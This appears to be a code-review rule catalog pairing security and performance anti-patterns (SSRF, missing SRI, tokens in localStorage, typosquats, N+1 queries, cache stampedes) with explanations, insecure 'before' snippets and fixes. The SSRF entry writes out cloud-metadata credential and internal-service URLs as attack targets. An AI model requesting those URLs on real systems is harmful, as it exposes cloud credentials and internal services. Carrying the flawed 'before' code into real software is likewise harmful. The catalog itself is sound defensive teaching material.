webhook URL, image proxy, or URL preview taken from input

terms.smell: The server fetches a user-supplied URL (webhook, image proxy, link preview) without validating the host/scheme, blocking private ranges, or refusing redirects.
terms.why: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returns cloud IAM credentials; `http://localhost:6379` / `http://10.0.0.5/admin` reach internal services behind the firewall. Redirects and DNS rebinding bypass naive hostname checks (CWE-918 / A10).
terms.fix: Allowlist host + scheme (https), resolve DNS and reject if the IP is private/link-local/ loopback/metadata (validate the resolved IP, not just the hostname — DNS rebinding), pin that IP for the request, and refuse or re-validate redirects. Egress-filter at the network layer too.

example.before: const r = await fetch(req.body.webhookUrl);

clean: const u = new URL(req.body.webhookUrl); if (!ALLOWED_HOSTS.has(u.hostname)) return res.sendStatus(400); await fetch(u, { redirect: 'error' });

terms.title: External <script>/CDN assets carry SRI hashes (or are self-hosted)

signals: a <script src=cdn...> with no integrity attribute
an external stylesheet without SRI

terms.smell: An external `<script>` or `<link rel=stylesheet>` is loaded from a CDN with no `integrity` (SRI) attribute.
terms.why: If the CDN, its DNS, or the maintainer account is compromised (a recurring event), the swapped script runs in every user's browser with full page access — credential/session theft, formjacking (CWE-353 / A08).
terms.fix: Add an `integrity` SRI hash and `crossorigin` to every external script/stylesheet so the browser rejects mismatched bytes. Better, self-host critical third-party scripts so the bytes are in your reviewed build.

example.before: <script src="https://cdn.example.com/lib@1.2.3/lib.min.js"></script>
example.after:
<script src="https://cdn.example.com/lib@1.2.3/lib.min.js"
        integrity="sha384-<base64-hash>" crossorigin="anonymous"></script>

terms.title: TLS enforced in transit; no plaintext sensitive data at rest

signals: an http:// endpoint for sensitive data / disabled cert verification
sensitive fields (PII, tokens, card data) stored unencrypted

terms.smell: Sensitive data travels over plaintext HTTP (or with certificate verification disabled), or sensitive fields (PII, tokens, card data) are stored unencrypted at rest.
terms.why: Data in transit without TLS is read/modified by anyone on the path; disabled cert checks allow MITM; plaintext-at-rest means one DB or backup leak exposes everything (CWE-319/311 / A02) — credential and data theft.
terms.fix: Enforce TLS for all sensitive traffic and keep certificate verification on; encrypt sensitive data at rest (DB/field/volume encryption) with keys held in a KMS.

terms.title: Session token not stored in localStorage for auth

signals: localStorage.setItem('token'|'jwt'|'access_token', ...)
reading an auth token from localStorage/sessionStorage

terms.smell: A session JWT or access token used for authentication is written to `localStorage` / `sessionStorage` rather than an httpOnly cookie.
terms.why: Web storage is readable by any JavaScript on the page, so a single XSS anywhere in the app exfiltrates the token and hands the attacker the victim's session — this turns an otherwise contained XSS into full account takeover (A07).
terms.fix: Store session tokens in an httpOnly, Secure, SameSite cookie the JS can't read; for SPA flows use a short-lived access token plus an httpOnly refresh cookie.

example.before: localStorage.setItem('access_token', token);
example.after: // server sets: Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax

clean: // httpOnly cookie set server-side; JS never touches the token

terms.title: New package isn't a typosquat; internal names scoped and private

signals: a new dep with a near-miss name (crossenv, reqeusts)
an internal package name that also exists on the public registry

terms.smell: A newly added dependency has a name that's a near-miss of a popular package, or an internal package name is resolvable from the public registry (no scope / private-registry config).
terms.why: Typosquatting: a malicious look-alike runs hostile code (often in `postinstall`) the moment it's installed. Dependency confusion: your private name also exists publicly at a higher version and the resolver pulls the attacker's copy — RCE in dev and CI (CWE-829 / A08).
terms.fix: Verify a new dep before adding it (exact name, publisher, downloads, repo, age). Scope internal packages (`@yourco/…`), host them on a private registry, and configure the resolver to never fetch those scopes from public. Pin and lock.

example.before: "crossenv": "1.0.0"     // real one is "cross-env"
example.after: "cross-env": "7.0.3"

terms.title: Secrets are high-entropy and rotatable (no guessable crypto material)

signals: JWT_SECRET = 'changeme' / short dictionary-word secret
a hardcoded AES/encryption key literal

terms.smell: A signing/JWT secret or encryption key is a short, dictionary, or default value ("changeme", "secret"), or a crypto key is hardcoded so every install shares it.
terms.why: Short/dictionary secrets are brute-forced offline; the attacker then forges valid JWTs or decrypts data. A hardcoded encryption key means one leak breaks every install (CWE-330/CWE-321).
terms.fix: Generate signing/JWT secrets with >=256 bits of CSPRNG entropy (`openssl rand -hex 32`); generate encryption keys and store them in a KMS, never in code; keep them rotatable.

example.before:
const JWT_SECRET = 'changeme';
const key = 'aaaaaaaaaaaaaaaa';
example.after: const JWT_SECRET = requireEnv('JWT_SECRET'); // openssl rand -hex 32, in a secret manager

terms.title: Caches have a TTL, explicit invalidation on write, and stampede protection on hot keys

signals: cache.set with no TTL, or no invalidation when the underlying row is written
naive get-or-compute: on miss, run the expensive query then set — no single-flight/lock

terms.smell: A cache entry is written with no TTL, isn't invalidated on the corresponding write, or uses naive get-or-compute so every concurrent miss recomputes the same value at once with no single-flight/lock.
terms.why: Stampede: a hot key expires and 5,000 in-flight requests all miss in the same instant and all run the same heavy query; DB CPU spikes to 100% and the service falls over — an outage triggered by an expiry, not a load increase, which is baffling in the postmortem. Bad invalidation: a price changes but the cache isn't cleared, so customers check out at the old price until the TTL lapses.
terms.fix: Give every entry a TTL (bounded staleness), invalidate explicitly on write, and protect hot keys from stampede — single-flight/lock (one recompute, others await), stale-while-revalidate (serve stale, refresh in background), jittered TTL, or early/probabilistic refresh before expiry.

example.before:
let v = await cache.get(key);
if (!v) { v = await db.expensiveQuery(); await cache.set(key, v); }  // no TTL, stampede
example.after:
return cache.getOrSet(key, () => db.expensiveQuery(), { ttl: 60, singleFlight: true });
// and on write: await db.products.update(id, patch); await cache.del(`product:${id}`);

trips: let v = await cache.get(key); if (!v) { v = await db.expensiveQuery(); await cache.set(key, v); }

terms.title: No check-then-act race — uniqueness enforced by a UNIQUE constraint + ON CONFLICT

signals: an exists()/findFirst()/SELECT check followed by a create()/INSERT on the same key
application-level uniqueness with no DB constraint behind it

terms.smell: Code checks a condition then acts on it with a window between — if not exists(SELECT WHERE email=$1): INSERT — relying on an application-level check for uniqueness with no DB constraint behind it.
terms.why: Two near-simultaneous signups with the same email both run the SELECT, both see "not exists", and both INSERT → duplicate accounts and broken downstream joins. The gap between the check and the act is unavoidable in app code; a bigger lock in the app doesn't close it.
terms.fix: Let the store arbitrate: put a UNIQUE constraint on the column and attempt the insert, handling the conflict — Postgres INSERT ... ON CONFLICT (email) DO NOTHING/DO UPDATE, MySQL INSERT ... ON DUPLICATE KEY UPDATE / INSERT IGNORE. The DB constraint is the only reliable arbiter.

example.before: -- SELECT WHERE email=$1; if none: INSERT ...
example.after: INSERT INTO users (email) VALUES ($1) ON CONFLICT (email) DO NOTHING;

trips: SELECT 1 FROM users WHERE email=$1; -- if empty, INSERT
clean: INSERT INTO users (email) VALUES ($1) ON CONFLICT (email) DO NOTHING
try { await db.users.create({ email }); } catch (e) { if (isUniqueViolation(e)) return existing; throw e; }

terms.title: Third-party CI actions and reusable workflows pinned to a full commit SHA

signals: uses: some-org/action@v3 or @main — a mutable tag or branch ref
a reusable workflow referenced by a floating ref

terms.smell: A third-party CI action or reusable workflow is referenced by a mutable tag or branch (@v3, @main, @master) rather than a full commit SHA.
terms.why: Whoever controls the upstream tag controls code that runs in your pipeline with your secrets. The tj-actions/changed-files compromise (2025) re-pointed a widely used tag to malware that dumped CI secrets — deploy keys, registry tokens, cloud credentials — into build logs for thousands of repos overnight; SHA-pinned repos were unaffected, floating-tag repos ran the malware on their next build (CWE-829 / A08).
terms.fix: Pin third-party actions and reusable workflows to a full commit SHA (leave the version in a comment) and let Dependabot/Renovate bump them through review. Keep first-party/official actions reasonably current, and treat pull_request_target and self-hosted runners on public repos as high-risk.

example.before: - uses: some-org/deploy-action@main
example.after: - uses: some-org/deploy-action@9f1e2d3c4b5a6...   # v3.1.0

terms.title: Collection endpoints are paginated with a server-enforced max page size

signals: a list endpoint returns .all()/findMany() with no limit
a client-supplied limit is trusted with no server-side cap
an endpoint returns a whole table or an unbounded collection

terms.smell: A collection endpoint returns every row, or accepts a client limit with no server-enforced ceiling — findMany() with no take, a whole table serialized into the response. "It's small today" is treated as a contract.
terms.why: A table that was 1k rows in dev is 40M in prod; the endpoint buffers the whole result in memory, OOMs or times out the service, and inflates serialization and transfer for every call — and only the big accounts trigger it, so it degrades silently.
terms.fix: Paginate with a default and a hard server-side max (e.g. default 50, cap 200), capping the client's limit regardless of what it asks for. Prefer cursor/keyset over deep OFFSET for large or live data, and make filter/sort params an allow-list.

example.before: res.json(await db.users.findMany()); // unbounded
example.after:
const limit = Math.min(Number(req.query.limit ?? 50), 200);
res.json(await db.users.findMany({ take: limit + 1, cursor }));

trips: return jsonify([e.dict() for e in db.events.all()])
clean: const limit = Math.min(Number(req.query.limit ?? 50), 200); db.users.findMany({ take: limit + 1, cursor })

terms.title: DB connections are pooled and sized to the DB's combined connection limit

signals: a fresh DB connection opened per request (connect() in the handler, no pool)
a pool max that, times the instance count, exceeds the DB's max_connections

terms.smell: Code opens a fresh DB connection per request (no pool), or the pool is mis-sized — too large across all instances for the DB, or too small so requests queue.
terms.why: Per-request connects add TCP+TLS+auth handshake latency to every request and, under load, saturate the DB's connection handling until it hits max_connections and rejects new connections — an outage from connection churn alone. Too large a pool thrashes the DB and total throughput drops; too small and requests queue and time out while the DB sits idle.
terms.fix: Use a shared, sized pool (min/max) and set max so the sum across all app instances respects the DB's max_connections. Don't hold a pooled connection across slow external IO. Where the DB's own limits should sit → database-review.

example.before:
def handler():
    conn = psycopg2.connect(DSN)   # TCP+TLS+auth per request

trips:
def handler():
    conn = psycopg2.connect(DSN)   # per request

terms.title: No synchronous CPU or blocking IO on a single-threaded event loop

signals: *Sync calls (readFileSync, pbkdf2Sync) in a request handler
a large JSON.parse, heavy compute loop, or backtracking regex on the hot path

terms.smell: On a single-threaded runtime (Node, an async Python worker) a synchronous CPU burst or blocking IO runs on the event loop in a request path — *Sync file/crypto calls, a large JSON.parse, a heavy loop, or a catastrophic-backtracking regex on user input.
terms.why: A sync 100ms hash (or a 400ms parse) on every request serializes the whole server: p99 latency for unrelated endpoints spikes to seconds because they're all queued behind the blocking call, and throughput collapses under concurrency even though each request's own work is small.
terms.fix: Use async IO/crypto (fs.promises, promisified crypto → libuv threadpool), move heavy CPU to a worker thread/pool or out of the request path, and bound/avoid regex backtracking on user input. Confirm with event-loop-lag metrics.

example.before: const hash = crypto.pbkdf2Sync(pw, salt, 600000, 64, 'sha512');  // blocks the loop
example.after: const hash = await promisify(crypto.pbkdf2)(pw, salt, 600000, 64, 'sha512');

trips: const data = JSON.parse(fs.readFileSync(path));  // sync IO + parse on the loop

terms.title: Deep pagination uses keyset/seek, not a large OFFSET

signals: pagination via LIMIT ... OFFSET with a potentially large/growing offset
deep OFFSET pagination on a large or live table

terms.smell: Pagination uses a large, growing OFFSET — LIMIT 20 OFFSET 100000 — on a large or live table.
terms.why: OFFSET n makes the engine read and discard n rows before returning yours — page 5000 scans 100k rows to show 20. Latency grows with page depth, so the deepest (often crawler/export) traffic is the slowest; and because concurrent inserts shift the window, rows get skipped or duplicated between pages.
terms.fix: Keyset/seek pagination: WHERE id > $last_seen_id ORDER BY id LIMIT 20. It stays O(LIMIT) regardless of depth and is stable under inserts; it needs a stable, indexed, unique sort key (often (created_at, id)).

example.before: SELECT ... ORDER BY id LIMIT 20 OFFSET 100000
example.after: SELECT ... WHERE id > $last_seen_id ORDER BY id LIMIT 20

trips: SELECT ... ORDER BY id LIMIT 20 OFFSET 100000
clean: SELECT ... WHERE id > $cursor ORDER BY id LIMIT 20

terms.title: Money is integer minor-units or decimal, never float

signals: a monetary field, column, or variable (price, total, amount, balance, fee, tax)
arithmetic on a money value

terms.smell: A monetary value is stored, transported, or computed as a binary float/double — a `float` column, a JS `number`, a `Double`.
terms.why: Binary floating point cannot represent decimal cents exactly (0.1 + 0.2 !== 0.3). The rounding drift corrupts money end to end: the DB column, the API payload, and the UI total disagree, and the error compounds across sums. Financial reconciliation eventually fails.
terms.fix: Store `numeric`/`decimal` (or integer minor units — cents). Transport as an integer count of minor units or a string. Do arithmetic in a decimal/integer type. Format to a display string only at the UI edge.

terms.title: No N+1 — no DB/HTTP call or lazy-loaded relation inside a loop over a result set

signals: a query/RPC/HTTP call inside a for/.map over a list of rows
accessing a lazy ORM relation (order.customer) inside a loop — N+1 disguised as a field read
an un-batched GraphQL field resolver that fetches a relation per item

terms.smell: A list is fetched, then one more round trip runs per row — a query/RPC/HTTP call inside a loop or .map, an un-batched field resolver, or a lazy ORM relation (order.customer.name) touched per iteration so each access silently fires its own SELECT.
terms.why: An endpoint that's snappy on 10 dev fixtures takes seconds in prod: 500 rows = 501 round trips. Each query is fast; the round-trip count is the killer and it scales with data, so it degrades silently over time. The lazy-relation flavor is worse in review because order.customer looks like a property access, not a query call.
terms.fix: Batch into one round trip: a join / eager include (Prisma include, SQLAlchemy selectinload/joinedload, ActiveRecord includes, TypeORM relations, GORM Preload), a WHERE id IN (...) then map in memory, or a DataLoader that coalesces per-item lookups within a tick. Treat any DB/HTTP call — or lazy relation access — inside a loop as N+1 until proven otherwise.

example.before:
const orders = await db.orders.findMany({ where: { userId } });
for (const o of orders) o.customer = await db.customers.findUnique({ where: { id: o.customerId } });
example.after: const orders = await db.orders.findMany({ where: { userId }, include: { customer: true } });

trips: for (const o of orders) o.customer = await db.customers.findUnique({ where: { id: o.customerId } })
for (const order of orders) { order.items }   // lazy relation per row
clean: db.orders.findMany({ where: { userId }, include: { customer: true } })

terms.title: Every network/IO call has an explicit timeout that fits the parent's deadline budget

signals: http.Get/fetch/a DB or gRPC call with no timeout, deadline, or AbortController
a child timeout longer than the parent request's SLA; no deadline propagation

terms.smell: A call that crosses a process boundary — HTTP, DB query, gRPC, cache, queue publish, lock acquisition — has no timeout/deadline, or a timeout longer than the parent request's budget with the remaining deadline not propagated to children. Most clients default to waiting forever.
terms.why: The payment provider degrades; with no timeout every request thread blocks on it, the connection pool drains, and unrelated endpoints start failing too — one slow dependency becomes a full outage. A too-long child timeout is the same cascade: stuck requests hold threads/connections and the service's p99 spikes.
terms.fix: Set an explicit timeout/deadline on every boundary-crossing call (http.Client{Timeout}, context.WithTimeout, an AbortController, a DB statement timeout, a gRPC deadline), sized to fit the budget — apportion a 500ms SLA across serial calls rather than giving each 500ms — and propagate the remaining deadline so a leaf fails fast. Assume no timeout unless you see one.

example.before: resp, err := http.Get(url)   // default client: no timeout
example.after:
ctx, cancel := context.WithTimeout(r.Context(), 300*time.Millisecond)
defer cancel()
resp, err := httpClient.Do(req.WithContext(ctx))

trips: resp, err := http.Get(url)   // default client: no timeout
const r = await fetch(url);  // no AbortController/timeout
clean: ctx, cancel := context.WithTimeout(ctx, 300*time.Millisecond); resp, err := httpClient.Do(req.WithContext(ctx))

terms.title: Internal error detail never reaches clients — no stack traces, and debug mode off in prod

signals: res.send(e.stack) / returning e.message directly to the client
an error response containing SQL, file paths, hostnames, or a library trace
DEBUG=true / app.debug in a prod path

terms.smell: A handler returns the raw exception — stack trace, message, SQL fragment, file paths, or internal hostname — in the client response, or debug mode is left on in production so the framework serves verbose error pages.
terms.why: A leaked stack trace or debug page hands an attacker your stack, framework versions, file paths, ORM, and query shapes (reconnaissance that turns a blind probe into a targeted exploit, CWE-209 / A05), and gives clients a brittle, ever-changing error contract — the real error only in the response, not correlatable to logs.
terms.fix: Disable debug in prod and ensure the framework's production error handler is active. Log full detail internally with a trace id; return a safe, stable envelope with a generic message and that trace_id. Never put exception text, stack frames, SQL, file paths, or hostnames in a client response.

example.before: } catch (e) { res.status(500).send(e.stack); }

terms.title: Read-modify-write is atomic in the store or guarded by optimistic versioning

signals: read a value, mutate in app memory, write it back (get_stock then set_stock-1)
a balance/inventory/counter decrement computed in app code then written

terms.smell: A value is read, modified in application memory, and written back — bal = SELECT balance; UPDATE SET balance = bal - 100. Two concurrent runs both read the same value and one's write overwrites the other's (lost update).
terms.why: Overselling and vanishing money: two orders each decrement stock from 10 and both write 9, so you ship inventory you don't have; two withdrawals both read 500 and both write 400, so one withdrawal disappears. The numbers silently drift with no error in the logs — only under concurrency.
terms.fix: Do the mutation atomically in the store — UPDATE inventory SET stock = stock - 1 WHERE sku = $1 AND stock >= 1, checking rows-affected — or use a pessimistic lock (SELECT ... FOR UPDATE then update in the same txn) or an optimistic version column (WHERE version = :expected, retry on 0 rows updated).

example.before: bal = (SELECT balance ...); UPDATE accounts SET balance = bal - 100 WHERE id = $1;
example.after: UPDATE accounts SET balance = balance - 100 WHERE id = $1 AND balance >= 100;

clean: UPDATE inventory SET stock = stock - 1 WHERE sku = :sku AND stock >= 1
UPDATE doc SET body=:b, version=version+1 WHERE id=:id AND version=:expected

terms.title: Request body size and content-type are bounded

signals: express.json() / a body parser mounted with no limit
an upload/import handler that buffers the whole body into memory
no content-type check on an endpoint accepting bodies

terms.smell: A JSON/body parser is mounted with the default (large) limit, an import/upload handler buffers the entire body into memory with no cap, or an endpoint accepts any content-type.
terms.why: A single client streams a 2GB (or deeply-nested) body and the parser exhausts memory and takes the process down — a cheap memory DoS from one request, no auth required (CWE-400 / A04).
terms.fix: Set an explicit small body limit (e.g. express.json({ limit: '256kb' })), reject unexpected content-types, bound array/string sizes in the validation schema, and stream large uploads rather than buffering.

example.before: app.use(express.json());
example.after: app.use(express.json({ limit: '256kb' }));

terms.title: No secrets or PII in logs, error responses, URLs, or build output

signals: logging a whole request/response, headers, token, password, card number, or user PII
err.message / a stack trace returned to the client, or a secret in a URL query string
a secret interpolated into an echo/print/run, curl -v, set -x, bare env, or an image ARG

terms.smell: Sensitive data reaches a log sink, a client error response, a URL, or build output: a log of headers/body/a whole object containing a token/password/PII, err.message echoed to the client, a secret in a query string, or a secret echoed in CI (echo ${{ secrets.X }}, curl -v, set -x, env) or baked into an image ARG layer.
terms.why: Logs and build output flow to shared dashboards, third-party SaaS, and long-term retention; one breach or a curious teammate yields live credentials (CWE-532) and a privacy/compliance violation (GDPR/PCI, OWASP A09). Errors echoed to clients leak connection strings and tokens to the attacker (CWE-209). A secret printed once is leaked forever and must be rotated; masking catches exact matches only — base64'd/sliced/derived values slip through.
terms.fix: Never log secrets or PII — log stable non-sensitive ids, and add logger-level redaction/deny-lists for known sensitive keys (authorization, cookie, password, token, secret, api_key). Return a generic error to clients and keep detail in redacted server logs. Keep secrets out of URLs. In CI, read secrets from env inside a script (never echo), drop -v/set -x/env from secret-bearing steps, and use a BuildKit --mount=type=secret instead of ARG.

example.before:
log.info('incoming', { headers: req.headers, body: req.body });
res.status(500).json({ error: err.message });
example.after:
log.info('incoming', { method: req.method, path: req.path, userId: req.user?.id });
res.status(500).json({ error: 'Internal error' });

terms.title: No SELECT * on hot paths — select only the columns the code uses

signals: SELECT * (or hydrating a full entity) when only a couple of columns are used
a hot-path query on a table with wide text/jsonb/bytea columns it never reads

terms.smell: A hot-path query uses SELECT * (or hydrates the full entity) when it needs only a few columns, especially on a table with wide text/jsonb/bytea columns.
terms.why: SELECT * drags a large profile_json/avatar_blob column over the wire and into memory you never read, inflating every response's cost and defeating a covering index-only scan that would otherwise satisfy the query from the index alone. In an ORM it also hydrates full objects (feeding N+1), and a later column add/reorder can silently balloon or break the query.
terms.fix: Project exactly the columns the code reads. A lean column list keeps the query index-friendly and unlocks index-only scans on hot reads.

example.before: SELECT * FROM users JOIN profiles ON ...
example.after: SELECT users.id, users.email, profiles.avatar_url FROM users JOIN profiles ON ...

trips: SELECT * FROM users JOIN profiles ON ...
const u = await db.query('SELECT * FROM users WHERE id = $1', [id]); return u.email;
clean: const u = await db.query('SELECT email FROM users WHERE id = $1', [id]); return u.email;

terms.title: A correlation/trace id is minted at the edge and propagated to logs, downstream calls, and errors

signals: no request/correlation id minted at the edge, or it isn't attached to logs
a new service in a request chain that doesn't propagate a trace id to downstream calls/errors

terms.smell: Requests have no correlation/trace id, or one is minted but not attached to every log line, forwarded to downstream calls, and surfaced in error responses — so logs across hops can't be stitched to one request.
terms.why: During an incident you can't stitch a user's failing request across services or from a support ticket (trace_id) to the logs; with a request fanning through four services and no shared id, the on-call can't tell which log lines belong to the same request — the investigation takes hours instead of one traceId=... query, while the outage runs.
terms.fix: Adopt the incoming W3C traceparent or mint a correlation id at the edge, stamp it on every log line, propagate it on every downstream hop, and include it in the error envelope (trace_id). Open a span per unit of work.

trips: // gateway -> new-processor -> downstream, no shared id, logs can't be stitched
clean: log.info({ traceId, msg })  // W3C traceparent propagated on every hop

terms.title: No unbounded read — filter and LIMIT in the query, don't load a whole table

signals: SELECT ... .fetchall()/findMany() with no WHERE or LIMIT, then filter in app
a list/search/feed query with no LIMIT
loading a whole table into memory to filter in code

terms.smell: A read returns an unbounded result set — a list/search/feed query with no LIMIT, or code that loads a whole table into memory and filters in the application instead of in the query.
terms.why: Works in dev with 50 rows; in prod the table grew to millions, so the query pulls gigabytes into the app, spikes memory, OOMs the pod, and saturates the DB's network — all to then filter in application code. The DB exists to filter; the failure scales with the table and shows up as an incident, not a warning.
terms.fix: Push the filter and a LIMIT into the query; return only the rows the code uses, bounded by a limit, and paginate. The DB should filter and bound the result, not the application.

example.before: SELECT * FROM messages WHERE room_id = $1 ORDER BY created_at DESC
example.after: SELECT id, body FROM messages WHERE room_id = $1 ORDER BY created_at DESC LIMIT 50

trips: SELECT * FROM messages WHERE room_id = $1 ORDER BY created_at DESC
users = db.query('SELECT * FROM users').fetchall(); active = [u for u in users if u.active]
clean: SELECT id, body FROM messages WHERE room_id = $1 ORDER BY created_at DESC LIMIT 50
db.query('SELECT id, email FROM users WHERE active = true ORDER BY id LIMIT :n', {'n': page_size})
